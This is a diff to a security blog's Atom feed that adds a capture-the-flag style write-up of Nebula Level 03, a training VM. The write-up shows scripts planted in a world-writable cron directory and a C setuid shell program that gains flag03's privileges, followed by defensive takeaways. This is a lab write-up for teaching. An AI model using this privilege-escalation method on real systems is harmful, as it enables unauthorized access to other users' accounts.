@@ -1,8 +1,128 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2020-04-23T19:17:45-05:00</updated><id>/feed.xml</id><title type="html">mythicalbits.github.io</title><entry><title type="html">Nebula Series - Level 02</title><link href="/2020/04/22/nebula-02.html" rel="alternate" type="text/html" title="Nebula Series - Level 02" /><published>2020-04-22T00:00:00-05:00</published><updated>2020-04-22T00:00:00-05:00</updated><id>/2020/04/22/nebula-02</id><content type="html" xml:base="/2020/04/22/nebula-02.html">&lt;p&gt;Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2020-04-26T18:53:47-05:00</updated><id>/feed.xml</id><title type="html">mythicalbits.github.io</title><entry><title type="html">Nebula Series - Level 03</title><link href="/2020/04/26/nebula-03.html" rel="alternate" type="text/html" title="Nebula Series - Level 03" /><published>2020-04-26T00:00:00-05:00</published><updated>2020-04-26T00:00:00-05:00</updated><id>/2020/04/26/nebula-03</id><content type="html" xml:base="/2020/04/26/nebula-03.html">&lt;p&gt;&lt;em&gt;Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
 in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file
-system race conditions.&lt;/p&gt;
+system race conditions.&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;Level 02 is a quick one thanks to an application that trusts us blindly.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Level 03&lt;/strong&gt;: the one where a scheduled job betrays its owner&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;Ok, so the first thing to understand is that cron jobs, similar to setuid binaries, run as a specific user. The instructions for
+this level indicate that there is a crontab that is called every couple of minutes and that we should inspect the files in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/flag03&lt;/code&gt;
+for more clues.&lt;/p&gt;
+
+&lt;p&gt;Taking a closer look at that directory we see&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level03@nebula:/home/flag03&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 4
+drwxrwxrwx 1 flag03 flag03  40 2020-04-10 06:27 writable.d
+&lt;span class=&quot;nt&quot;&gt;-rwxr--r--&lt;/span&gt; 1 flag03 flag03 103 2020-04-10 06:19 writable.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There’s a directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/writable.d&lt;/code&gt;, that has some pretty lax permissions, and a script that’s likely
+related to the scheduled job mentioned in the instructions.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level03@nebula:/home/flag03&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./writable.sh
+&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /home/flag03/writable.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ulimit&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; bash &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ok, so the script iterates over the files in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/writable.d&lt;/code&gt;, executes them, and then deletes them.
+Could we abuse this to write to a directory we otherwise wouldn’t have permission to? Say… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag03&lt;/code&gt;’s home directory?&lt;/p&gt;
+
+&lt;p&gt;We place the following script in a file in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/writable.d&lt;/code&gt; and wait for the scheduled job to run&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /home/flag03/test
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After a few minutes we check the directory&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level03@nebula:/home/flag03&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 4
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 flag03 flag03   0 2020-04-10 06:39 &lt;span class=&quot;nb&quot;&gt;test
+&lt;/span&gt;drwxrwxrwx 1 flag03 flag03  40 2020-04-10 06:39 writable.d
+&lt;span class=&quot;nt&quot;&gt;-rwxr--r--&lt;/span&gt; 1 flag03 flag03 103 2020-04-10 06:19 writable.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sure enough, our script placed a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt; file, owned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag03&lt;/code&gt; in their home directory. Now what?&lt;/p&gt;
+
+&lt;p&gt;We’ve already learned from previous levels that a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid&lt;/code&gt; binary can be exploited to gain the privileges of
+the user that owns it, and we just learned that we can create files as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag03&lt;/code&gt;; the plan is coming together.&lt;/p&gt;
+
+&lt;p&gt;Because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid&lt;/code&gt; is ignored on interpreted executables, let’s write a simple C program that changes our real uid
+and runs a shell.&lt;/p&gt;
+
+&lt;p&gt;We’ll put the following in a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.c&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;uid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;setresuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we’ll compile it and save the output as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2_exploit&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc /home/level03/exploit.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /home/level03/2_exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next, let’s create a script called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1_exploit.sh&lt;/code&gt; that, when run by the scheduled job, will copy our executable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag03&lt;/code&gt;’s home directory
+and enable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /home/flag03/writable.d/2_exploit /home/flag03/exploit
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +s /home/flag03/exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We’ve numbered the files so that they get executed in the proper order by the cron job otherwise it might delete our binary before
+it gets copied.&lt;/p&gt;
+
+&lt;p&gt;We copy both of those files to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/flag03/writable.d&lt;/code&gt; and wait for the scheduled job to run.&lt;/p&gt;
+
+&lt;p&gt;A few minutes later we see our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt; binary sitting in our target’s home directory waiting for us to use it. Note that it’s
+owned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag03&lt;/code&gt; and is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level03@nebula:/home/flag03&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 12
+&lt;span class=&quot;nt&quot;&gt;-rwsrwsr-x&lt;/span&gt; 1 flag03 flag03 7243 2020-04-10 07:15 exploit
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 flag03 flag03    0 2020-04-10 06:39 &lt;span class=&quot;nb&quot;&gt;test
+&lt;/span&gt;drwxrwxrwx 1 flag03 flag03   40 2020-04-10 07:15 writable.d
+&lt;span class=&quot;nt&quot;&gt;-rwxr--r--&lt;/span&gt; 1 flag03 flag03  103 2020-04-10 06:19 writable.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All that’s left is to run our executable to get a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag03&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level03@nebula:/home/flag03&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./exploit
+bash-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;flag03
+bash-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In summary:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;each cron job runs as a specific user&lt;/li&gt;
+  &lt;li&gt;if the job executes scripts in a directory with lax access controls, it can be exploited&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file system race conditions. Level 03: the one where a scheduled job betrays its owner</summary></entry><entry><title type="html">Nebula Series - Level 02</title><link href="/2020/04/22/nebula-02.html" rel="alternate" type="text/html" title="Nebula Series - Level 02" /><published>2020-04-22T00:00:00-05:00</published><updated>2020-04-22T00:00:00-05:00</updated><id>/2020/04/22/nebula-02</id><content type="html" xml:base="/2020/04/22/nebula-02.html">&lt;p&gt;&lt;em&gt;Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
+in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file
+system race conditions.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Level 02&lt;/strong&gt; is a quick one thanks to an application that trusts us blindly.&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -83,11 +203,11 @@ Instead, we are presented with a shell as &lt;code class=&quot;language-plaintex
 &lt;ul&gt;
   &lt;li&gt;assume all input is malicious&lt;/li&gt;
   &lt;li&gt;if possible, avoid dynamically composing commands with user provided data&lt;/li&gt;
-&lt;/ul&gt;</content><author><name></name></author><summary type="html">Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file system race conditions. Level 02 is a quick one thanks to an application that trusts us blindly.</summary></entry><entry><title type="html">Nebula Series - Level 01</title><link href="/2020/04/20/nebula-01.html" rel="alternate" type="text/html" title="Nebula Series - Level 01" /><published>2020-04-20T00:00:00-05:00</published><updated>2020-04-20T00:00:00-05:00</updated><id>/2020/04/20/nebula-01</id><content type="html" xml:base="/2020/04/20/nebula-01.html">&lt;p&gt;Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file system race conditions. Level 02 is a quick one thanks to an application that trusts us blindly.</summary></entry><entry><title type="html">Nebula Series - Level 01</title><link href="/2020/04/20/nebula-01.html" rel="alternate" type="text/html" title="Nebula Series - Level 01" /><published>2020-04-20T00:00:00-05:00</published><updated>2020-04-20T00:00:00-05:00</updated><id>/2020/04/20/nebula-01</id><content type="html" xml:base="/2020/04/20/nebula-01.html">&lt;p&gt;&lt;em&gt;Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
 in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file
-system race conditions.&lt;/p&gt;
+system race conditions.&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;Level 01 introduces us to the concept of setuid and the dangers of trusting the user’s environment
+&lt;p&gt;&lt;strong&gt;Level 01&lt;/strong&gt; introduces us to the concept of setuid and the dangers of trusting the user’s environment
 to invoke another executable from within our code.&lt;/p&gt;
 
 &lt;!--more--&gt;
